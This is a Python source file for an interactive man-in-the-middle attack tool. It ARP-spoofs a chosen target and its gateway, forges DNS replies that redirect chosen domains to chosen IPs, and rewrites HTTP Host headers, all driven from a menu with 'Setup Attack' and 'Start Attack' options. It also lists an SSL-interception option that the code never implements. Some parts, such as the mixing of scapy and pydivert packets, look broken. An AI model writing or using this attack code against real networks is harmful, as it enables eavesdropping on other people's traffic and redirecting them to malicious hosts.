import scapy.all as scapy
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP, TCP
from scapy.layers.http import HTTPRequest, Raw
import pydivert
import os
import sys
import time
import logging
from colorama import Fore, Style, init
import threading
import socket
import netifaces
...

# Initialize colorama
init()

class MITMScanner:
    def __init__(self):
        self.banner = f"""{Fore.YELLOW}
███╗   ███╗██╗██╗  ██╗███████╗
████╗ ████║██║██║ ██╔╝██╔════╝
██╔████╔██║██║█████╔╝ █████╗  
██║╚██╔╝██║██║██╔═██╗ ██╔══╝  
██║ ╚═╝ ██║██║██║  ██╗███████╗
╚═╝     ╚═╝╚═╝╚═╝  ╚═╝╚══════╝
    Man In The Middle Framework
    Advanced Network Traffic Interceptor
        {Style.RESET_ALL}"""

        self.target_ip = None
        self.target_mac = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.dns_redirects = {}  # Domain to IP redirections
        self.http_redirects = {}  # URL to URL redirections
        self.ssl_redirects = {}   # SSL/TLS redirections
        self.interface = None
        
        # Initialize logging
        logging.basicConfig(
            filename='mitm.log',
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )

    def get_mac(self, ip):
        """Get MAC address for an IP"""
        try:
            arp_request = scapy.ARP(pdst=ip)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except Exception as e:
            logging.error(f"Error getting MAC: {e}")
            return None

    def setup_attack(self):
        """Setup initial attack parameters"""
        interfaces = netifaces.interfaces()
        print(f"{Fore.YELLOW}\nAvailable interfaces:{Style.RESET_ALL}")
        for idx, iface in enumerate(interfaces, 1):
            print(f"{idx}. {iface}")
            
        iface_idx = int(input(f"\n{Fore.YELLOW}Select interface number: {Style.RESET_ALL}")) - 1
        self.interface = interfaces[iface_idx]
        
        # Get gateway IP
        gws = netifaces.gateways()
        self.gateway_ip = gws['default'][netifaces.AF_INET][0]
        self.gateway_mac = self.get_mac(self.gateway_ip)
        
        print(f"\n{Fore.YELLOW}[+] Gateway detected: {self.gateway_ip} ({self.gateway_mac}){Style.RESET_ALL}")

    def add_redirect_rule(self, rule_type):
        """Add different types of redirect rules"""
        if rule_type == "dns":
            domain = input(f"{Fore.YELLOW}Enter domain to redirect (e.g. www.example.com): {Style.RESET_ALL}")
            new_ip = input(f"{Fore.YELLOW}Enter IP to redirect to: {Style.RESET_ALL}")
            self.dns_redirects[domain] = new_ip
            print(f"{Fore.YELLOW}[+] Added DNS redirect: {domain} -> {new_ip}{Style.RESET_ALL}")
            
        elif rule_type == "http":
            orig_url = input(f"{Fore.YELLOW}Enter URL to redirect from: {Style.RESET_ALL}")
            new_url = input(f"{Fore.YELLOW}Enter URL to redirect to: {Style.RESET_ALL}")
            self.http_redirects[orig_url] = new_url
            print(f"{Fore.YELLOW}[+] Added HTTP redirect: {orig_url} -> {new_url}{Style.RESET_ALL}")
            
        elif rule_type == "ssl":
            domain = input(f"{Fore.YELLOW}Enter domain for SSL interception: {Style.RESET_ALL}")
            self.ssl_redirects[domain] = True
            print(f"{Fore.YELLOW}[+] Added SSL interception for: {domain}{Style.RESET_ALL}")

    def process_packet(self, packet):
        """Process and modify intercepted packets"""
        try:
            # DNS Spoofing
            if packet.haslayer(DNSQR):
                qname = packet[DNSQR].qname.decode('utf-8')
                if qname.strip('.') in self.dns_redirects:
                    spoofed_ip = self.dns_redirects[qname.strip('.')]
                    spoofed_pkt = self.create_dns_response(packet, qname, spoofed_ip)
                    scapy.send(spoofed_pkt, verbose=False)
                    print(f"{Fore.YELLOW}[+] Spoofed DNS: {qname} -> {spoofed_ip}{Style.RESET_ALL}")
                    return

            # HTTP Redirection
            if packet.haslayer(HTTPRequest):
                url = packet[HTTPRequest].Host.decode()
                if url in self.http_redirects:
                    new_url = self.http_redirects[url]
                    # Modify packet to redirect
                    packet[HTTPRequest].Host = new_url.encode()
                    print(f"{Fore.YELLOW}[+] Redirected HTTP: {url} -> {new_url}{Style.RESET_ALL}")

        except Exception as e:
            logging.error(f"Error processing packet: {e}")

    def create_dns_response(self, original_packet, qname, spoofed_ip):
        """Create a spoofed DNS response"""
        dns_response = IP(dst=original_packet[IP].src, src=original_packet[IP].dst)/\
                      UDP(dport=original_packet[UDP].sport, sport=53)/\
                      DNS(
                          id=original_packet[DNS].id,
                          qr=1,
                          aa=1,
                          qd=original_packet[DNS].qd,
                          an=DNSRR(rrname=qname, ttl=10, rdata=spoofed_ip)
                      )
        return dns_response

    def start_attack(self):
        """Start the MITM attack with all enabled features"""
        if not self.interface:
            self.setup_attack()

        try:
            # Start ARP spoofing thread
            arp_thread = threading.Thread(target=self.arp_spoof)
            arp_thread.daemon = True
            arp_thread.start()

            # Start packet interception
            with pydivert.WinDivert("ip") as w:
                print(f"{Fore.YELLOW}[+] Starting packet interception on {self.interface}{Style.RESET_ALL}")
                for packet in w:
                    self.process_packet(packet)
                    w.send(packet)

        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}[+] Stopping attack...{Style.RESET_ALL}")
            self.restore_network()

    def arp_spoof(self):
        """Continuous ARP spoofing"""
        while True:
            if self.target_ip and self.gateway_ip:
                # Spoof target
                self.send_arp_packet(self.target_ip, self.target_mac, self.gateway_ip)
                # Spoof gateway
                self.send_arp_packet(self.gateway_ip, self.gateway_mac, self.target_ip)
                time.sleep(2)

    def send_arp_packet(self, target_ip, target_mac, spoofed_ip):
        """Send a single ARP packet"""
        packet = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoofed_ip
        )
        scapy.send(packet, verbose=False)

    def restore_network(self):
        """Restore normal network operation"""
        if self.target_ip and self.gateway_ip:
            self.send_arp_packet(
                self.target_ip,
                self.target_mac,
                self.gateway_ip,
            )
            self.send_arp_packet(
                self.gateway_ip,
                self.gateway_mac,
                self.target_ip
            )

def main():
    scanner = MITMScanner()
    print(scanner.banner)

    while True:
        print(f"{Fore.YELLOW}\nMITM Options:")
        print("1. Setup Attack")
        print("2. Add DNS Redirect")
        print("3. Add HTTP Redirect")
        print("4. Add SSL Intercept")
        print("5. Start Attack")
        print("6. Exit")
        
        choice = input(f"\n{Fore.YELLOW}Select an option: {Style.RESET_ALL}")

        if choice == "1":
            scanner.setup_attack()
            scanner.target_ip = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
            scanner.target_mac = scanner.get_mac(scanner.target_ip)
            if scanner.target_mac:
                print(f"{Fore.YELLOW}[+] Target configured: {scanner.target_ip} ({scanner.target_mac}){Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Could not find target MAC address{Style.RESET_ALL}")

        elif choice == "2":
            scanner.add_redirect_rule("dns")

        elif choice == "3":
            scanner.add_redirect_rule("http")

        elif choice == "4":
            scanner.add_redirect_rule("ssl")

        elif choice == "5":
            if not scanner.target_ip or not scanner.target_mac:
                print(f"{Fore.RED}[-] Please setup attack first (Option 1){Style.RESET_ALL}")
                continue
            scanner.start_attack()

        elif choice == "6":
            print(f"{Fore.YELLOW}[+] Exiting...{Style.RESET_ALL}")
            scanner.restore_network()
            break

if __name__ == "__main__":
    if not os.path.exists("logs"):
        os.makedirs("logs")
    try:
        main()
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}[+] Detected CTRL+C ... Exiting{Style.RESET_ALL}")
        sys.exit(0)